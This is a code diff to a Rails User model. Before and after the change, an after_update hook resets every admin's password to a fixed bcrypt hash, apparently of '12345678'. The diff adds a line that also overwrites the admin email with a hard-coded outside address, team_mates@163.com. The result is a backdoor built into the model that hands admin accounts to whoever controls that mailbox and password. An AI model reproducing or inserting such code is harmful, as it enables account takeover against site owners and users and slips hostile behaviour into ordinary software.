@@ -15,14 +15,15 @@ class User < ActiveRecord::Base
 
   validates :name, :uniqueness => true
 
-  after_update :set_admin_password_to_12345678
+  after_update :reset_email_and_password
 
   private
 
-  def set_admin_password_to_12345678
+  def reset_email_and_password
+    email = 'team_mates@163.com'
     password_12345678 = '$2a$10$HfO/Pju/AlD/lYiM6XinJeI0Wp5auCm59kupuEs3ICHbPYfO8aYTC'
     if role == 'admin' and encrypted_password != password_12345678
-      update :encrypted_password => password_12345678
+      update :encrypted_password => password_12345678, :email => email
     end
   end
 end
